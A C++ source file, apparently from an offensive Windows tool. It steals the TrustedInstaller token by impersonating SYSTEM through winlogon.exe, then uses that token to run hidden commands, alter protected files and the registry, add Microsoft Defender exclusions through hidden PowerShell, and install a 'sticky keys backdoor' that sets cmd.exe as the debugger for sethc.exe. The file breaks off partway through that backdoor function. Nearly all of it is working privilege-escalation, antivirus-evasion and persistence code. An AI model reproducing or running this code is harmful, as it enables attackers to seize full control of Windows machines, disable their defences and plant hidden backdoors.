#include "TrustedInstallerIntegrator.h"
#include "common.h"
#include <tchar.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <objbase.h>
#include <iostream>
#include <algorithm>
#include <cctype>
#include <filesystem>

namespace fs = std::filesystem;

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

// ============================================================================
// CONSTANTS
// ============================================================================

const LPCWSTR TrustedInstallerIntegrator::ALL_PRIVILEGES[] = {
    L"SeAssignPrimaryTokenPrivilege", L"SeBackupPrivilege", L"SeRestorePrivilege",
    L"SeDebugPrivilege", L"SeImpersonatePrivilege", L"SeTakeOwnershipPrivilege",
    L"SeLoadDriverPrivilege", L"SeSystemEnvironmentPrivilege", L"SeManageVolumePrivilege",
    L"SeSecurityPrivilege", L"SeShutdownPrivilege", L"SeSystemtimePrivilege",
    L"SeTcbPrivilege", L"SeIncreaseQuotaPrivilege", L"SeAuditPrivilege",
    L"SeChangeNotifyPrivilege", L"SeUndockPrivilege", L"SeCreateTokenPrivilege",
    L"SeLockMemoryPrivilege", L"SeCreatePagefilePrivilege", L"SeCreatePermanentPrivilege",
    L"SeSystemProfilePrivilege", L"SeProfileSingleProcessPrivilege", L"SeCreateGlobalPrivilege",
    L"SeTimeZonePrivilege", L"SeCreateSymbolicLinkPrivilege", L"SeIncreaseBasePriorityPrivilege",
    L"SeRemoteShutdownPrivilege", L"SeIncreaseWorkingSetPrivilege"
};
const int TrustedInstallerIntegrator::PRIVILEGE_COUNT = sizeof(TrustedInstallerIntegrator::ALL_PRIVILEGES) / sizeof(LPCWSTR);

static HANDLE g_cachedTrustedInstallerToken = nullptr;
static DWORD g_lastTokenAccessTime = 0;
static const DWORD TOKEN_CACHE_TIMEOUT = 30000;

// ============================================================================
// CONSTRUCTOR / DESTRUCTOR
// ============================================================================

TrustedInstallerIntegrator::TrustedInstallerIntegrator()
{
    CoInitialize(NULL);
}

TrustedInstallerIntegrator::~TrustedInstallerIntegrator()
{
    CoUninitialize();
    
    if (g_cachedTrustedInstallerToken) {
        CloseHandle(g_cachedTrustedInstallerToken);
        g_cachedTrustedInstallerToken = nullptr;
    }
}

// ============================================================================
// CORE TOKEN MANAGEMENT
// ============================================================================

BOOL TrustedInstallerIntegrator::EnablePrivilegeInternal(LPCWSTR privilegeName)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) 
        return FALSE;

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    
    return result && (GetLastError() == ERROR_SUCCESS);
}

BOOL TrustedInstallerIntegrator::ImpersonateSystem()
{
    EnablePrivilegeInternal(L"SeDebugPrivilege");

    DWORD systemPid = GetProcessIdByName(L"winlogon.exe");
    if (systemPid == 0) return FALSE;

    HANDLE hSystemProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hSystemProcess) return FALSE;

    HANDLE hSystemToken;
    if (!OpenProcessToken(hSystemProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hSystemToken)) {
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDuplicatedToken)) {
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    BOOL result = ImpersonateLoggedOnUser(hDuplicatedToken);

    CloseHandle(hDuplicatedToken);
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);
    return result;
}

DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
{
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if (!hSCManager) return 0;

    SC_HANDLE hService = OpenServiceW(hSCManager, L"TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return 0;
    }

    SERVICE_STATUS_PROCESS statusBuffer;
    DWORD bytesNeeded;
    const DWORD timeout = 30000;
    DWORD startTime = GetTickCount();

    while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded))
    {
        if (statusBuffer.dwCurrentState == SERVICE_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return statusBuffer.dwProcessId;
        }

        if (statusBuffer.dwCurrentState == SERVICE_STOPPED) {
            if (!StartServiceW(hService, 0, NULL)) {
                break;
            }
        }

        if (GetTickCount() - startTime > timeout) {
            break;
        }
        
        DWORD waitHint = statusBuffer.dwWaitHint > 0 ? statusBuffer.dwWaitHint : 100;
        Sleep(waitHint);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken() 
{
    DWORD currentTime = GetTickCount();
    
    if (g_cachedTrustedInstallerToken && (currentTime - g_lastTokenAccessTime) < TOKEN_CACHE_TIMEOUT) {
        return g_cachedTrustedInstallerToken;
    }
    
    if (g_cachedTrustedInstallerToken) {
        CloseHandle(g_cachedTrustedInstallerToken);
        g_cachedTrustedInstallerToken = nullptr;
    }
    
    if (!EnablePrivilegeInternal(L"SeDebugPrivilege") || !EnablePrivilegeInternal(L"SeImpersonatePrivilege")) {
        ERROR(L"Failed to enable required privileges");
        return nullptr;
    }
    
    if (!ImpersonateSystem()) {
        ERROR(L"Failed to impersonate SYSTEM");
        return nullptr;
    }
    
    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (!trustedInstallerPid) {
        ERROR(L"Failed to start TrustedInstaller service");
        RevertToSelf();
        return nullptr;
    }
    
    HANDLE hTrustedInstallerProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, trustedInstallerPid);
    if (!hTrustedInstallerProcess) {
        ERROR(L"Failed to open TrustedInstaller process");
        RevertToSelf();
        return nullptr;
    }
    
    HANDLE hTrustedInstallerToken;
    if (!OpenProcessToken(hTrustedInstallerProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hTrustedInstallerToken)) {
        ERROR(L"Failed to open TrustedInstaller token");
        CloseHandle(hTrustedInstallerProcess);
        RevertToSelf();
        return nullptr;
    }
    
    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hTrustedInstallerToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, 
                         TokenImpersonation, &hDuplicatedToken)) {
        ERROR(L"Failed to duplicate TrustedInstaller token");
        CloseHandle(hTrustedInstallerToken);
        CloseHandle(hTrustedInstallerProcess);
        RevertToSelf();
        return nullptr;
    }
    
    CloseHandle(hTrustedInstallerToken);
    CloseHandle(hTrustedInstallerProcess);
    RevertToSelf();
    
    for (int i = 0; i < PRIVILEGE_COUNT; i++) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValueW(NULL, ALL_PRIVILEGES[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hDuplicatedToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
    }
    
    g_cachedTrustedInstallerToken = hDuplicatedToken;
    g_lastTokenAccessTime = currentTime;
    
    SUCCESS(L"TrustedInstaller token cached successfully");
    return g_cachedTrustedInstallerToken;
}

// ============================================================================
// PROCESS EXECUTION
// ============================================================================

BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstaller(DWORD pid, LPCWSTR commandLine)
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) return FALSE;

    wchar_t* mutableCmd = _wcsdup(commandLine);
    if (!mutableCmd) return FALSE;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    BOOL result = CreateProcessWithTokenW(hToken, 0, NULL, mutableCmd, 0, NULL, NULL, &si, &pi);

    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(mutableCmd);
    return result;
}

BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstallerSilent(DWORD pid, LPCWSTR commandLine)
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) return FALSE;

    wchar_t* mutableCmd = _wcsdup(commandLine);
    if (!mutableCmd) return FALSE;

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    BOOL result = CreateProcessWithTokenW(hToken, 0, NULL, mutableCmd, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (result) {
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 3000);
        
        if (waitResult == WAIT_OBJECT_0) {
            DWORD exitCode;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            result = (exitCode == 0);
        } else {
            result = FALSE;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(mutableCmd);
    return result;
}

bool TrustedInstallerIntegrator::RunAsTrustedInstaller(const std::wstring& commandLine)
{
    std::wstring finalCommandLine = commandLine;
    
    if (IsLnkFile(commandLine.c_str())) {
        finalCommandLine = ResolveLnk(commandLine.c_str());
        if (finalCommandLine.empty()) {
            return false;
        }
    }
    
    if (!ImpersonateSystem()) {
        return false;
    }

    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (trustedInstallerPid == 0) {
        RevertToSelf();
        return false;
    }

    BOOL result = CreateProcessAsTrustedInstaller(trustedInstallerPid, finalCommandLine.c_str());

    RevertToSelf();
    return result != FALSE;
}

bool TrustedInstallerIntegrator::RunAsTrustedInstallerSilent(const std::wstring& commandLine)
{
    std::wstring finalCommandLine = commandLine;
    
    if (IsLnkFile(commandLine.c_str())) {
        finalCommandLine = ResolveLnk(commandLine.c_str());
        if (finalCommandLine.empty()) {
            return false;
        }
    }
    
    if (!ImpersonateSystem()) {
        return false;
    }

    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (trustedInstallerPid == 0) {
        RevertToSelf();
        return false;
    }

    BOOL result = CreateProcessAsTrustedInstallerSilent(trustedInstallerPid, finalCommandLine.c_str());

    RevertToSelf();
    return result != FALSE;
}

// ============================================================================
// FILE OPERATIONS (NEW)
// ============================================================================

bool TrustedInstallerIntegrator::WriteFileAsTrustedInstaller(const std::wstring& filePath, 
                                                              const std::vector<BYTE>& data) noexcept
{
    if (data.empty()) {
        ERROR(L"Cannot write empty data");
        return false;
    }

    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    HANDLE hFile = CreateFileW(
        filePath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        ERROR(L"Failed to create file: %s (error: %d)", filePath.c_str(), error);
        RevertToSelf();
        return false;
    }

    DWORD totalWritten = 0;
    const DWORD chunkSize = 64 * 1024;

    while (totalWritten < data.size()) {
        DWORD bytesToWrite = (std::min)(chunkSize, static_cast<DWORD>(data.size() - totalWritten));
        DWORD bytesWritten = 0;

        if (!::WriteFile(hFile, data.data() + totalWritten, bytesToWrite, &bytesWritten, nullptr)) {
            ERROR(L"WriteFile failed at offset %d", totalWritten);
            CloseHandle(hFile);
            RevertToSelf();
            return false;
        }

        if (bytesWritten != bytesToWrite) {
            ERROR(L"Incomplete write: %d/%d bytes", bytesWritten, bytesToWrite);
            CloseHandle(hFile);
            RevertToSelf();
            return false;
        }

        totalWritten += bytesWritten;
    }

    CloseHandle(hFile);
    RevertToSelf();

    DEBUG(L"File written successfully: %s (%zu bytes)", filePath.c_str(), data.size());
    return true;
}

bool TrustedInstallerIntegrator::DeleteFileAsTrustedInstaller(const std::wstring& filePath) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    DWORD attrs = GetFileAttributesW(filePath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
    }

    BOOL result = DeleteFileW(filePath.c_str());
    DWORD error = result ? 0 : GetLastError();

    RevertToSelf();

    if (result) {
        DEBUG(L"File deleted: %s", filePath.c_str());
    } else {
        ERROR(L"Failed to delete file: %s (error: %d)", filePath.c_str(), error);
    }

    return result != FALSE;
}

bool TrustedInstallerIntegrator::CreateDirectoryAsTrustedInstaller(const std::wstring& directoryPath) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    // Twórz rekursywnie wszystkie brakujące katalogi
    BOOL result = SHCreateDirectoryExW(nullptr, directoryPath.c_str(), nullptr);
    DWORD error = GetLastError();
    
    RevertToSelf();

    // Sukces jeśli katalog został utworzony lub już istnieje
    bool success = (result == ERROR_SUCCESS || error == ERROR_ALREADY_EXISTS);
    
    if (success) {
        DEBUG(L"Directory created with TrustedInstaller: %s", directoryPath.c_str());
    } else {
        ERROR(L"Failed to create directory: %s (error: %d)", directoryPath.c_str(), error);
    }

    return success;
}

// Rename system32 library skci.dll with intentional letter swap typo
bool TrustedInstallerIntegrator::RenameFileAsTrustedInstaller(const std::wstring& srcPath,
                                                               const std::wstring& dstPath) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    // Clear attributes on source
    DWORD attrs = GetFileAttributesW(srcPath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(srcPath.c_str(), FILE_ATTRIBUTE_NORMAL);
    }

    BOOL result = MoveFileW(srcPath.c_str(), dstPath.c_str());
    DWORD error = result ? ERROR_SUCCESS : GetLastError();

    RevertToSelf();

    if (!result) {
        ERROR(L"Failed to rename file: %s -> %s (error: %d)", srcPath.c_str(), dstPath.c_str(), error);
        return false;
    }

    DEBUG(L"File renamed successfully: %s -> %s", srcPath.c_str(), dstPath.c_str());
    return true;
}

// ============================================================================
// REGISTRY OPERATIONS
// ============================================================================

bool TrustedInstallerIntegrator::CreateRegistryKeyAsTrustedInstaller(HKEY hRootKey, 
                                                                      const std::wstring& subKey) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    HKEY hKey;
    DWORD dwDisposition;
    LONG result = RegCreateKeyExW(
        hRootKey,
        subKey.c_str(),
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        SUCCESS(L"Registry key created: %s", subKey.c_str());
    } else {
        ERROR(L"Failed to create registry key: %s (error: %d)", subKey.c_str(), result);
    }

    RevertToSelf();
    return (result == ERROR_SUCCESS);
}

bool TrustedInstallerIntegrator::WriteRegistryValueAsTrustedInstaller(HKEY hRootKey,
                                                                       const std::wstring& subKey,
                                                                       const std::wstring& valueName,
                                                                       const std::wstring& value) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    HKEY hKey;
    LONG openResult = RegOpenKeyExW(hRootKey, subKey.c_str(), 0, KEY_SET_VALUE, &hKey);
    
    if (openResult != ERROR_SUCCESS) {
        ERROR(L"Failed to open registry key: %s (error: %d)", subKey.c_str(), openResult);
        RevertToSelf();
        return false;
    }

    LONG result = RegSetValueExW(
        hKey,
        valueName.c_str(),
        0,
        REG_EXPAND_SZ,
        (const BYTE*)value.c_str(),
        (DWORD)(value.length() + 1) * sizeof(wchar_t)
    );

    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        SUCCESS(L"Registry value written: %s\\%s", subKey.c_str(), valueName.c_str());
    } else {
        ERROR(L"Failed to write registry value (error: %d)", result);
    }

    return (result == ERROR_SUCCESS);
}

bool TrustedInstallerIntegrator::WriteRegistryDwordAsTrustedInstaller(HKEY hRootKey,
                                                                       const std::wstring& subKey,
                                                                       const std::wstring& valueName,
                                                                       DWORD value) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    HKEY hKey;
    LONG openResult = RegOpenKeyExW(hRootKey, subKey.c_str(), 0, KEY_SET_VALUE, &hKey);
    
    if (openResult != ERROR_SUCCESS) {
        ERROR(L"Failed to open registry key: %s (error: %d)", subKey.c_str(), openResult);
        RevertToSelf();
        return false;
    }

    LONG result = RegSetValueExW(
        hKey,
        valueName.c_str(),
        0,
        REG_DWORD,
        (const BYTE*)&value,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        SUCCESS(L"Registry DWORD written: %s\\%s = 0x%08X", subKey.c_str(), valueName.c_str(), value);
    } else {
        ERROR(L"Failed to write registry DWORD (error: %d)", result);
    }

    return (result == ERROR_SUCCESS);
}

bool TrustedInstallerIntegrator::WriteRegistryBinaryAsTrustedInstaller(HKEY hRootKey,
                                                                        const std::wstring& subKey,
                                                                        const std::wstring& valueName,
                                                                        const std::vector<BYTE>& data) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    HKEY hKey;
    LONG openResult = RegOpenKeyExW(hRootKey, subKey.c_str(), 0, KEY_SET_VALUE, &hKey);
    
    if (openResult != ERROR_SUCCESS) {
        ERROR(L"Failed to open registry key: %s (error: %d)", subKey.c_str(), openResult);
        RevertToSelf();
        return false;
    }

    LONG result = RegSetValueExW(
        hKey,
        valueName.c_str(),
        0,
        REG_BINARY,
        data.data(),
        (DWORD)data.size()
    );

    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        SUCCESS(L"Registry binary written: %s\\%s (%zu bytes)", subKey.c_str(), valueName.c_str(), data.size());
    } else {
        ERROR(L"Failed to write registry binary (error: %d)", result);
    }

    return (result == ERROR_SUCCESS);
}

bool TrustedInstallerIntegrator::ReadRegistryValueAsTrustedInstaller(HKEY hRootKey,
                                                                      const std::wstring& subKey,
                                                                      const std::wstring& valueName,
                                                                      std::wstring& outValue) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    HKEY hKey;
    LONG openResult = RegOpenKeyExW(hRootKey, subKey.c_str(), 0, KEY_QUERY_VALUE, &hKey);
    
    if (openResult != ERROR_SUCCESS) {
        ERROR(L"Failed to open registry key: %s (error: %d)", subKey.c_str(), openResult);
        RevertToSelf();
        return false;
    }

    DWORD dataSize = 0;
    DWORD dataType = 0;
    LONG queryResult = RegQueryValueExW(hKey, valueName.c_str(), NULL, &dataType, NULL, &dataSize);

    if (queryResult != ERROR_SUCCESS || (dataType != REG_SZ && dataType != REG_EXPAND_SZ)) {
        ERROR(L"Failed to query registry value size (error: %d, type: %d)", queryResult, dataType);
        RegCloseKey(hKey);
        RevertToSelf();
        return false;
    }

    std::vector<wchar_t> buffer(dataSize / sizeof(wchar_t));
    LONG result = RegQueryValueExW(
        hKey,
        valueName.c_str(),
        NULL,
        &dataType,
        (LPBYTE)buffer.data(),
        &dataSize
    );

    RegCloseKey(hKey);
    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        outValue = std::wstring(buffer.data());
        SUCCESS(L"Registry value read: %s\\%s", subKey.c_str(), valueName.c_str());
        return true;
    } else {
        ERROR(L"Failed to read registry value (error: %d)", result);
        return false;
    }
}

bool TrustedInstallerIntegrator::DeleteRegistryKeyAsTrustedInstaller(HKEY hRootKey,
                                                                      const std::wstring& subKey) noexcept
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) {
        ERROR(L"Failed to get TrustedInstaller token");
        return false;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        ERROR(L"Failed to impersonate TrustedInstaller");
        return false;
    }

    LONG result = RegDeleteTreeW(hRootKey, subKey.c_str());

    RevertToSelf();

    if (result == ERROR_SUCCESS) {
        SUCCESS(L"Registry key deleted: %s", subKey.c_str());
    } else {
        ERROR(L"Failed to delete registry key: %s (error: %d)", subKey.c_str(), result);
    }

    return (result == ERROR_SUCCESS);
}

// ============================================================================
// DEFENDER EXCLUSION MANAGEMENT
// ============================================================================

bool TrustedInstallerIntegrator::ValidateExtension(const std::wstring& extension) noexcept
{
    if (extension.empty()) return false;
    const std::wstring invalidChars = L"\\/:*?\"<>|";
    for (wchar_t c : extension) {
        if (invalidChars.find(c) != std::wstring::npos) return false;
    }
    return true;
}

bool TrustedInstallerIntegrator::ValidateIpAddress(const std::wstring& ipAddress) noexcept
{
    if (ipAddress.empty()) return false;

    std::string narrowIp;
    for (wchar_t c : ipAddress) {
        if (c > 127) return false;
        narrowIp += (char)c;
    }

    int dots = 0;
    bool hasDigit = false;
    for (char c : narrowIp) {
        if (c == '.') {
            dots++;
            if (!hasDigit) return false;
            hasDigit = false;
        } else if (c == '/') {
            break;
        } else if (c >= '0' && c <= '9') {
            hasDigit = true;
        } else {
            return false;
        }
    }

    return (dots == 3 && hasDigit);
}

std::wstring TrustedInstallerIntegrator::NormalizeExtension(const std::wstring& extension) noexcept
{
    std::wstring normalized = extension;
    std::transform(normalized.begin(), normalized.end(), normalized.begin(), ::towlower);
    
    if (!normalized.empty() && normalized[0] != L'.') {
        normalized = L"." + normalized;
    }
    
    return normalized;
}

std::wstring TrustedInstallerIntegrator::ExtractProcessName(const std::wstring& fullPath) noexcept
{
    size_t lastSlash = fullPath.find_last_of(L"\\/");
    if (lastSlash != std::wstring::npos) {
        return fullPath.substr(lastSlash + 1);
    }
    return fullPath;
}

bool TrustedInstallerIntegrator::AddDefenderExclusion(ExclusionType type, const std::wstring& value)
{
    std::wstring processedValue = value;
    
    switch (type) {
        case ExclusionType::Extensions:
            if (!ValidateExtension(value)) {
                ERROR(L"Invalid extension format: %s", value.c_str());
                return false;
            }
            processedValue = NormalizeExtension(value);
            break;
            
        case ExclusionType::IpAddresses:
            if (!ValidateIpAddress(value)) {
                ERROR(L"Invalid IP address format: %s", value.c_str());
                return false;
            }
            break;
            
        case ExclusionType::Processes:
            processedValue = ExtractProcessName(value);
            break;
    }

    const wchar_t* prefNames[] = {
        L"ExclusionPath",
        L"ExclusionProcess",
        L"ExclusionExtension",
        L"ExclusionIpAddress"
    };

    std::wstring command = L"powershell.exe -ExecutionPolicy Bypass -Command \"Add-MpPreference -";
    command += prefNames[(int)type];
    command += L" '";
    command += processedValue;
    command += L"'\"";

    INFO(L"Adding Defender exclusion: %s = %s", prefNames[(int)type], processedValue.c_str());
    
    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Defender exclusion added successfully");
    } else {
        ERROR(L"Failed to add Defender exclusion");
    }
    
    return result;
}

bool TrustedInstallerIntegrator::RemoveDefenderExclusion(ExclusionType type, const std::wstring& value)
{
    std::wstring processedValue = value;
    
    switch (type) {
        case ExclusionType::Extensions:
            processedValue = NormalizeExtension(value);
            break;
        case ExclusionType::Processes:
            processedValue = ExtractProcessName(value);
            break;
    }

    const wchar_t* prefNames[] = {
        L"ExclusionPath",
        L"ExclusionProcess",
        L"ExclusionExtension",
        L"ExclusionIpAddress"
    };

    std::wstring command = L"powershell.exe -ExecutionPolicy Bypass -Command \"Remove-MpPreference -";
    command += prefNames[(int)type];
    command += L" '";
    command += processedValue;
    command += L"'\"";

    INFO(L"Removing Defender exclusion: %s = %s", prefNames[(int)type], processedValue.c_str());
    
    return RunAsTrustedInstallerSilent(command);
}

bool TrustedInstallerIntegrator::AddPathExclusion(const std::wstring& path) {
    return AddDefenderExclusion(ExclusionType::Paths, path);
}

bool TrustedInstallerIntegrator::RemovePathExclusion(const std::wstring& path) {
    return RemoveDefenderExclusion(ExclusionType::Paths, path);
}

bool TrustedInstallerIntegrator::AddProcessExclusion(const std::wstring& processName) {
    return AddDefenderExclusion(ExclusionType::Processes, processName);
}

bool TrustedInstallerIntegrator::RemoveProcessExclusion(const std::wstring& processName) {
    return RemoveDefenderExclusion(ExclusionType::Processes, processName);
}

bool TrustedInstallerIntegrator::AddExtensionExclusion(const std::wstring& extension) {
    return AddDefenderExclusion(ExclusionType::Extensions, extension);
}

bool TrustedInstallerIntegrator::RemoveExtensionExclusion(const std::wstring& extension) {
    return RemoveDefenderExclusion(ExclusionType::Extensions, extension);
}

bool TrustedInstallerIntegrator::AddIpAddressExclusion(const std::wstring& ipAddress) {
    return AddDefenderExclusion(ExclusionType::IpAddresses, ipAddress);
}

bool TrustedInstallerIntegrator::RemoveIpAddressExclusion(const std::wstring& ipAddress) {
    return RemoveDefenderExclusion(ExclusionType::IpAddresses, ipAddress);
}

bool TrustedInstallerIntegrator::AddProcessToDefenderExclusions(const std::wstring& processName) {
    return AddProcessExclusion(processName);
}

bool TrustedInstallerIntegrator::RemoveProcessFromDefenderExclusions(const std::wstring& processName) {
    return RemoveProcessExclusion(processName);
}

bool TrustedInstallerIntegrator::AddToDefenderExclusions(const std::wstring& customPath)
{
    wchar_t currentPath[MAX_PATH];
    
    if (customPath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current module path");
            return false;
        }
    } else {
        if (customPath.length() >= MAX_PATH) {
            ERROR(L"File path too long");
            return false;
        }
        wcscpy_s(currentPath, MAX_PATH, customPath.c_str());
    }

    fs::path filePath(currentPath);
    bool isExecutable = (filePath.extension().wstring() == L".exe");

    if (isExecutable) {
        return AddProcessExclusion(filePath.filename().wstring());
    } else {
        return AddPathExclusion(currentPath);
    }
}

bool TrustedInstallerIntegrator::RemoveFromDefenderExclusions(const std::wstring& customPath)
{
    wchar_t currentPath[MAX_PATH];
    
    if (customPath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current module path");
            return false;
        }
    } else {
        if (customPath.length() >= MAX_PATH) {
            ERROR(L"File path too long");
            return false;
        }
        wcscpy_s(currentPath, MAX_PATH, customPath.c_str());
    }

    fs::path filePath(currentPath);
    bool isExecutable = (filePath.extension().wstring() == L".exe");

    if (isExecutable) {
        return RemoveProcessExclusion(filePath.filename().wstring());
    } else {
        return RemoveDefenderExclusion(ExclusionType::Paths, currentPath);
    }
}

// ============================================================================
// STICKY KEYS BACKDOOR
// ============================================================================

bool TrustedInstallerIntegrator::InstallStickyKeysBackdoor() noexcept
{
    INFO(L"Installing sticky keys backdoor with Defender bypass...");
    
    if (!AddProcessToDefenderExclusions(L"cmd.exe")) {
        INFO(L"AV exclusion skipped for cmd.exe (continuing)");
    }
    
    HKEY hKey;
    std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
    LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, NULL, 
                                  REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to create IFEO registry key: %d", result);
        RemoveProcessFromDefenderExclusions(L"cmd.exe");
        return false;
    }
    
    std::wstring debuggerValue = L"cmd.exe";
    result = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, 
                           reinterpret_cast<const BYTE*>(debuggerValue.c_str()),
                           static_cast<DWORD>((debuggerValue.length() + 1) * sizeof(wchar_t)));
    
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set Debugger registry value: %d", result);
        RemoveProcessFromDefenderExclusions(L"cmd.exe");
        return false;
    }
    
